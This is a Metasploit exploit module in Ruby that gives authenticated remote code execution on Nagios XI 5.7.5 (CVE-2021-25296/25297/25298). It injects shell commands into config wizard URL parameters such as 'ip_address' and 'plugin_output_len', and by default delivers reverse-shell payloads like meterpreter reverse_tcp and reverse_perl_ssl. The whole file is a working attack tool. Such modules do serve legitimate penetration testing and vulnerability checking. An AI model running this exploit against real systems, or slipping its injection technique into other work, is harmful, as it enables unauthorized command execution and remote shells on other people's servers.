##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::NagiosXi
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Nagios XI 5.7.5 - ConfigWizards Authenticated Remote Code Exection',
        'Description' => %q{
          This module exploits CVE-2021-25296, CVE-2021-25297, or CVE-2021-25298,
          OS command injection vulnerabilities in the `ip_address` or `plugin_output_len`
          URL paramaeters which allow an authenticated user to perform remote code
          execution on Nagios XI 5.7.5 as the apache user.

          Valid credentials for a Nagios XI user are required. This module has
          been successfully tested against the official NagiosXI 5.7.5 OVA.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Matthew Mathur'
        ],
        'References' => [
          ['CVE', '2021-25296'],
          ['CVE', '2021-25297'],
          ['CVE', '2021-25298'],
          ['URL', 'https://github.com/fs0c-sh/nagios-xi-5.7.5-bugs/blob/main/README.md']
        ],
        'Platform' => %w[linux unix],
        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_CMD ],
        'Targets' => [
          [
            'Linux (x86/x64)', {
              'Arch' => [ ARCH_X86, ARCH_X64 ],
              'Platform' => 'linux',
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ],
          [
            'CMD', {
              'Arch' => [ ARCH_CMD ],
              'Platform' => 'unix',
              # the only reliable payloads against a typical Nagios XI host (CentOS 7 minimal) seem to be cmd/unix/reverse_perl_ssl and cmd/unix/reverse_openssl
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl_ssl' }
            }
          ]
        ],
        'Privileged' => false,
        'DefaultTarget' => 1,
        'DisclosureDate' => '2021-02-13',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )

    register_options [
      OptString.new('TARGET_CONFIG_WIZARD', [true, 'Targeted Configuration Wizard (windowswmi, digitalocean, or switch)', 'windowswmi'])
    ]
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def finish_install
    datastore['FINISH_INSTALL']
  end

  def authenticate
    # Use nagios_xi_login to try and authenticate. If authentication succeeds, nagios_xi_login returns
    # an array containing the http response body of a get request to index.php and the session cookies
    login_result, res_array = nagios_xi_login(username, password, finish_install)
    case login_result
    when 1..3 # An error occurred
      fail_with(Failure::Unknown, 'Failed to authenticate to NagiosXI')
    when 4 # Nagios XI is not fully installed
      install_result = install_nagios_xi(password)
      if install_result
        fail_with(Failure::Unknown, 'Failed to authenticate to NagiosXI')
      end

      login_result, res_array = login_after_install_or_license(username, password, finish_install)
      case login_result
      when 1..3 # An error occurred
        fail_with(Failure::Unknown, 'Failed to authenticate to NagiosXI')
      when 4 # Nagios XI is still not fully installed
        fail_with(Failure::Unknown, 'Failed to install Nagios XI on the target.')
      when 5
        auth_cookies, nsp = res_array
        sign_license_result = sign_license_agreement(auth_cookies, nsp)
        if sign_license_result
          fail_with(Failure::Unknown, 'Failed to authenticate to NagiosXI')
        end

        login_result, res_array = login_after_install_or_license(username, password, finish_install)
        case login_result
        when 1..3
          fail_with(Failure::Unknown, 'Failed to authenticate to NagiosXI')
        when 4 # Nagios XI is still not fully installed
          fail_with(Failure::Unknown, 'Failed to install Nagios XI on the target.')
        when 5 # the Nagios XI license agreement still has not been signed
          fail_with(Failure::Unknown, 'Failed to sign the license agreement.')
        end
      end
    end
    print_good('Successfully authenticated to Nagios XI.')

    @auth_cookies = res_array[1] # if we are here, this cannot be nil since the mixin checks for that already
    @nsp = res_array[0].scan(/nsp_str = "([a-z0-9]+)/)[0][0]

    return res_array
  end

  def check
    # Authenticate to ensure we can access the NagiosXI version
    version_response = authenticate

    nagios_version = nagios_xi_version(version_response[0])
    if nagios_version.nil?
      return CheckCode::Detected('Unable to obtain the Nagios XI version from the dashboard')
    end

    print_status("Target is Nagios XI with version #{nagios_version}.")

    if /^\d{4}R\d\.\d/.match(nagios_version) || /^\d{4}RC\d/.match(nagios_version) || /^\d{4}R\d.\d[A-Ha-h]/.match(nagios_version) || nagios_version == '5R1.0'
      nagios_version = '1.0.0' # Set to really old version as a placeholder.
    end

    # Check if the target is the vulnerable version
    version = Rex::Version.new(nagios_version)
    if version == Rex::Version.new('5.7.5')
      return CheckCode::Appears
    end

    return CheckCode::Safe
  end

  def execute_command(cmd, _opts = {})
    if !@nsp || !@auth_cookies # Check to see if we already authenticated during the check
      authenticate
    end

    # execute payload based on the selected targeted configuration wizard
    url_params = {
      'update' => 1,
      'nsp' => @nsp
    }
    if datastore['TARGET_CONFIG_WIZARD'] == 'windowswmi'
      url_params = url_params.merge({
        'nextstep' => 3,
        'wizard' => 'windowswmi',
        'ip_address' => Rex::Text.rand_text_alpha(7..15),
        'domain' => Rex::Text.rand_text_alpha(7..15),
        'username' => Rex::Text.rand_text_alpha(7..20),
        'password' => Rex::Text.rand_text_alpha(7..20),
        'plugin_output_len' => Rex::Text.rand_text_numeric(5) + "; #{cmd};"
      })
    elsif datastore['TARGET_CONFIG_WIZARD'] == 'switch'
      url_params = url_params.merge({
        'nextstep' => 3,
        'wizard' => 'switch',
        'ip_address' => "\"; #{cmd};",
        'snmpopts[snmpcommunity]' => Rex::Text.rand_text_alpha(7..15),
        'scaninterfaces' => 'on'
      })
    elsif datastore['TARGET_CONFIG_WIZARD'] == 'digitalocean'
      url_params = url_params.merge({
        'ip_address' => "; #{cmd};",
        'nextstep' => 4,
        'wizard' => 'digitalocean'
      })
    else
      fail_with(Failure::BadConfig, 'Invalid TARGET_CONFIG_WIZARD: Choose windowswmi, switch, or digitalocean.')
    end

    send_request_cgi({
      'method' => 'GET',
      'uri' => '/nagiosxi/config/monitoringwizard.php',
      'cookie' => @auth_cookies,
      'vars_get' => url_params
    }, 0)
  end

  def exploit
    if target.arch.first == ARCH_CMD
      print_status('Executing the payload')
      execute_command(payload.encoded)
    else
      execute_cmdstager(background: true)
    end
  end
end
